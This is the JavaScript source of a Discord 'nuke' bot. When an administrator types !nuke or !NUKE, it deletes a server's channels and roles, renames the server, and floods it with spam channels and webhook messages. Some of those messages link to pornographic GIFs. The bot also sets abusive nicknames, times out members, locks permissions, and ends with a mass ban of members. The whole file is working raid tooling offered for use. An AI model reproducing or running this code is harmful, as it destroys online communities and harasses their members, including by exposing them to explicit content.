require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const PROTECTED_CHANNEL = 'aaaaaaaa';
const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000;

let nukeActive = false;
let currentMode = 'normal';
let ticking = false; // prevents overlapping ticks
let nukeTimeout = null;
let loopRunning = false;

// ================== CACHES ==================
const webhookCache = new Map(); // channelId_name -> webhook
const memberCache = new Map();  // guildId -> members collection
const cacheTimers = new Map();

// ================== GIF SLOTS ==================
const GIF_TYPE_1 = ["https://klipy.com/gifs/orgasm-cumming-1"];
const GIF_TYPE_2 = ["https://klipy.com/gifs/vegan-porn-carrot-porn"];

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'OP NUKE', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
  'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
  'REALITY BROKEN', 'CHAOS OVERLOAD', 'TOTAL COLLAPSE', 'FINAL STAGE',
  'NO ESCAPE', 'WEBHOOK ARMY', 'ARMY ONLINE', 'BOSS RAGE', 'FULL AGGRO',
  'MULTI TASK', 'PARALLEL CHAOS', '5X OP', 'OVERPOWERED', 'VERY AGGRESSIVE'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead', 'chaos', 'void',
  'pain', 'end', 'lmao', 'gg', 'bot-was-here', 'no-escape', 'server-corpse',
  'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
  'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
  'minion-spam', 'boss-room', 'collapse', 'broken', 'army', 'flood', 'wave',
  'aggro', 'rage', 'kill', 'multi', 'parallel', 'pressure', 'op', 'very'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
  'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
  'SILENCED', 'BROKEN', 'ARMY TARGET', 'WEBHOOK VICTIM', 'BOSS TARGET',
  'RAGE VICTIM', 'AGGRO', 'MULTI VICTIM', 'PRESSURED', 'OP VICTIM'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion',
  'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Army', 'Flooded',
  'Boss Marked', 'Rage', 'Aggro', 'Doomed', 'Parallel', 'Pressure', 'OP'
];

const MESSAGES = [
  '**NUKE MODE**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
  'OWNED', 'THE END', 'RIP SERVER', 'YOU CANNOT STOP THIS', 'BOT WINS',
  'GOODBYE', 'MINIONS ARE HELPING', 'ARMY INCOMING', 'TOO MANY WEBHOOKS',
  'MUTED', 'SILENCE', 'NO ESCAPE', 'ARMY OVERWHELM', 'BOSS RAGE',
  'FULL PRESSURE', 'PARALLEL DESTRUCTION', 'VERY AGGRESSIVE', 'OVERPOWERED'
];

const ARMY_NAMES = [
  'Minion', 'Army-1', 'Army-2', 'Flood', 'Screamer', 'Null', 'Hunter',
  'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos', 'Destroyer',
  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord', 'Rage', 'Aggro',
  'OP-1', 'OP-2', 'OP-3'
];

const ARMY_MESSAGES = [
  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
  'no survivors', 'mute activated', 'gif spam', 'reality break',
  'webhook army', 'too many of us', 'flooding now', 'we are many',
  'no hope', 'collapse', 'army online', 'boss is raging', 'full aggro',
  'multi tasking', 'parallel chaos', 'very aggressive', 'overpowered'
];

// ================== HELPERS ==================
function randomItem(arr) {
  if (!arr?.length) return null;
  return arr[(Math.random() * arr.length) | 0];
}

function chance(percent) {
  return Math.random() * 100 < percent;
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

// Cached member fetch
async function getMembers(guild) {
  const key = guild.id;
  if (memberCache.has(key)) return memberCache.get(key);

  const members = await guild.members.fetch().catch(() => null);
  if (members) {
    memberCache.set(key, members);
    // expire cache after 20s
    setTimeout(() => memberCache.delete(key), 20000);
  }
  return members;
}

// Cached webhook get/create
async function getOrCreateWebhook(channel, name = 'Minion') {
  const key = `${channel.id}_${name}`;
  if (webhookCache.has(key)) return webhookCache.get(key);

  try {
    const webhooks = await channel.fetchWebhooks();
    let webhook = webhooks.find(wh => wh.name === name);
    if (!webhook) {
      webhook = await channel.createWebhook({ name, reason: 'Nuke Army' });
    }
    webhookCache.set(key, webhook);
    return webhook;
  } catch {
    return null;
  }
}

async function safeDelete(channel) {
  if (!channel || channel.name === PROTECTED_CHANNEL) return;
  return channel.delete('NUKE').catch(() => {});
}

// ================== FINAL BAN WAVE ==================
async function finalBanWave(guild) {
  console.log('🔪 FINAL BAN WAVE STARTING...');
  const members = await getMembers(guild);
  if (!members) return;

  let banned = 0, timedOut = 0, failed = 0;

  // Parallel ban/timeout attempts
  await Promise.allSettled([...members.values()].map(async (member) => {
    if (member.user.bot || member.id === guild.ownerId) return;

    try {
      if (member.bannable) {
        await member.ban({ reason: 'NUKE - FINAL WAVE' });
        banned++;
        return;
      }
    } catch {}

    try {
      if (member.moderatable) {
        await member.timeout(FINAL_TIMEOUT, 'NUKE - FALLBACK');
        timedOut++;
        return;
      }
    } catch {}

    failed++;
  }));

  console.log(`✅ FINAL WAVE → Banned: ${banned} | Timed out: ${timedOut} | Failed: ${failed}`);
}

// ================== BOSS ACTIONS (optimized) ==================
const bossActions = [
  // Rename server
  async (guild) => {
    guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
  },

  // Mass delete channels (parallel)
  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    await Promise.allSettled(channels.map(ch => safeDelete(ch)));
  },

  // Mass create channels (parallel)
  async (guild) => {
    const count = currentMode === 'very' ? 16 : 11;
    const tasks = Array.from({ length: count }, () =>
      guild.channels.create({
        name: randomItem(CHANNEL_NAMES),
        type: ChannelType.GuildText,
      })
        .then(ch => ch.send(randomItem(MESSAGES)).catch(() => {}))
        .catch(() => {})
    );
    await Promise.allSettled(tasks);
  },

  // Temp flash channels
  async (guild) => {
    const count = currentMode === 'very' ? 9 : 6;
    const tasks = Array.from({ length: count }, () =>
      guild.channels.create({
        name: randomItem(['temp', 'flash', 'glitch', 'rage', 'op', 'kill']),
        type: ChannelType.GuildText,
      })
        .then(async ch => {
          ch.send('👁').catch(() => {});
          setTimeout(() => ch.delete().catch(() => {}), 1000 + Math.random() * 2000);
        })
        .catch(() => {})
    );
    await Promise.allSettled(tasks);
  },

  // Delete roles (parallel)
  async (guild) => {
    const roles = [...guild.roles.cache.values()].filter(r => r.id !== guild.id && r.editable);
    await Promise.allSettled(roles.map(r => r.delete('NUKE').catch(() => {})));
  },

  // Create roles (parallel)
  async (guild) => {
    const count = currentMode === 'very' ? 13 : 8;
    const tasks = Array.from({ length: count }, () =>
      guild.roles.create({
        name: randomItem(ROLE_NAMES),
        color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
        reason: 'NUKE',
      }).catch(() => {})
    );
    await Promise.allSettled(tasks);
  },

  // Nickname hell (parallel + cached members)
  async (guild) => {
    const members = await getMembers(guild);
    if (!members) return;
    await Promise.allSettled(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => m.setNickname(randomItem(NICKNAMES)).catch(() => {}))
    );
  },

  // Mute hell (parallel)
  async (guild) => {
    const members = await getMembers(guild);
    if (!members) return;
    const times = currentMode === 'very'
      ? [3600, 7200, 14400, 28800]
      : [1800, 3600, 7200, 14400];

    await Promise.allSettled(
      [...members.values()]
        .filter(m => !m.user.bot && m.moderatable)
        .map(m => {
          const time = times[(Math.random() * times.length) | 0] * 1000;
          return m.timeout(time, 'NUKE').catch(() => {});
        })
    );
  },

  // Message spam (parallel)
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    const spam = currentMode === 'very' ? 8 : 5;
    const tasks = [];
    for (const channel of channels.values()) {
      for (let i = 0; i < spam; i++) {
        tasks.push(channel.send(randomItem(MESSAGES)).catch(() => {}));
      }
    }
    await Promise.allSettled(tasks);
  },

  // Permission lock (parallel)
  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    await Promise.allSettled(
      [...channels.values()].map(channel =>
        channel.permissionOverwrites.edit(guild.roles.everyone, {
          ViewChannel: chance(currentMode === 'very' ? 3 : 7),
          SendMessages: false,
          Connect: false,
          Speak: false,
          AddReactions: false,
          AttachFiles: false,
        }).catch(() => {})
      )
    );
  },

  // Bot nick
  async (guild) => {
    guild.members.me.setNickname(randomItem([
      currentMode === 'very' ? 'VERY AGGRESSIVE' : 'NUKE',
      'OVERPOWERED', 'PARALLEL CHAOS', 'BOSS RAGE', 'OVERLORD', 'THE DESTROYER'
    ])).catch(() => {});
  },

  // Role assign hell
  async (guild) => {
    const members = await getMembers(guild);
    const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
    if (!members || !roles.length) return;

    await Promise.allSettled(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => {
          const role = randomItem(roles);
          return role ? m.roles.add(role).catch(() => {}) : Promise.resolve();
        })
    );
  },
];

// ================== ARMY ACTIONS (optimized) ==================
const armyActions = [
  // Heavy GIF army
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    const nameCount = currentMode === 'very' ? 12 : 8;
    const perWebhook = currentMode === 'very' ? 4 : 2;

    const tasks = [];
    for (const channel of channels.values()) {
      for (const name of ARMY_NAMES.slice(0, nameCount)) {
        tasks.push((async () => {
          const wh = await getOrCreateWebhook(channel, name);
          if (!wh) return;
          const sends = Array.from({ length: perWebhook }, () => {
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            return wh.send({ content: gif || randomItem(ARMY_MESSAGES), username: name }).catch(() => {});
          });
          await Promise.allSettled(sends);
        })());
      }
    }
    await Promise.allSettled(tasks);
  },

  // Text flood army
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    const loops = currentMode === 'very' ? 8 : 5;
    const tasks = [];
    for (const channel of channels.values()) {
      for (let i = 0; i < loops; i++) {
        tasks.push((async () => {
          const wh = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
          if (!wh) return;
          await wh.send({
            content: randomItem(ARMY_MESSAGES),
            username: randomItem(ARMY_NAMES),
          }).catch(() => {});
        })());
      }
    }
    await Promise.allSettled(tasks);
  },

  // Army creates spam channels
  async (guild) => {
    const count = currentMode === 'very' ? 7 : 4;
    const tasks = Array.from({ length: count }, () => (async () => {
      try {
        const ch = await guild.channels.create({
          name: randomItem(['army-spam', 'op-wave', 'flood', 'aggro', 'very']),
          type: ChannelType.GuildText,
        });
        const inner = ARMY_NAMES.slice(0, 4).map(async name => {
          const wh = await getOrCreateWebhook(ch, name);
          if (!wh) return;
          const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
          return wh.send({ content: gif || randomItem(ARMY_MESSAGES), username: name }).catch(() => {});
        });
        await Promise.allSettled(inner);
      } catch {}
    })());
    await Promise.allSettled(tasks);
  },

  // Symbol spam
  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
    const tasks = [...channels.values()].map(async channel => {
      const wh = await getOrCreateWebhook(channel, 'Glitch');
      if (!wh) return;
      await wh.send({
        content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸']),
        username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
      }).catch(() => {});
    });
    await Promise.allSettled(tasks);
  },
];

// ================== OPTIMIZED TICK ==================
async function runNukeTick(guild) {
  if (!guild || ticking) return;
  if (!guild.members.me?.permissions?.has(PermissionFlagsBits.Administrator)) return;

  ticking = true;
  const start = Date.now();

  const bossCount = currentMode === 'very' ? 12 : 8;
  const armyCount = currentMode === 'very' ? 5 : 3;

  const selectedBoss = [...bossActions].sort(() => Math.random() - 0.5).slice(0, bossCount);
  const selectedArmy = [...armyActions].sort(() => Math.random() - 0.5).slice(0, armyCount);

  // Everything in parallel
  await Promise.allSettled([
    ...selectedBoss.map(fn => fn(guild)),
    ...selectedArmy.map(fn => fn(guild)),
  ]);

  console.log(`⚡ ${currentMode.toUpperCase()} tick done in ${Date.now() - start}ms`);
  ticking = false;
}

// ================== NON-OVERLAPPING LOOP ==================
async function nukeLoop(guild) {
  const interval = currentMode === 'very' ? 1800 : 3500;

  while (nukeActive) {
    const start = Date.now();
    await runNukeTick(guild);

    const elapsed = Date.now() - start;
    const delay = Math.max(interval - elapsed, 200);
    await sleep(delay);
  }
}

// ================== START / STOP ==================
async function startNuke(guild, message, mode = 'normal') {
  if (nukeActive) {
    if (message) await message.reply('⚠️ Nuke already running.');
    return;
  }

  currentMode = mode;
  nukeActive = true;
  memberCache.delete(guild.id); // fresh members

  if (message) {
    await message.reply(
      mode === 'very'
        ? '💣 **VERY AGGRESSIVE MODE**\nFaster loop + heavier parallel load.'
        : '💣 **NORMAL AGGRESSIVE MODE**'
    );
  }

  console.log(`💣 NUKE STARTED → ${mode.toUpperCase()}`);

  // Start non-overlapping loop
  nukeLoop(guild);

  // 5 minute end + ban wave
  nukeTimeout = setTimeout(async () => {
    nukeActive = false;
    console.log('⏰ 5 MIN OVER → FINAL BAN WAVE');
    await finalBanWave(guild);
    console.log('🛑 NUKE ENDED');
  }, 5 * 60 * 1000);
}

// ================== EVENTS ==================
client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 OPTIMIZED DUAL-MODE NUKE READY`);
  console.log(`→ !nuke  = Normal`);
  console.log(`→ !NUKE  = VERY Aggressive (faster)`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member?.permissions?.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!NUKE') {
    await startNuke(message.guild, message, 'very');
  } else if (message.content === '!nuke') {
    await startNuke(message.guild, message, 'normal');
  }

  if (message.content === '!nuke-stop' || message.content === '!NUKE-STOP') {
    nukeActive = false;
    if (nukeTimeout) clearTimeout(nukeTimeout);
    await message.reply('🛑 Nuke stopped.');
  }
});

client.login(TOKEN);
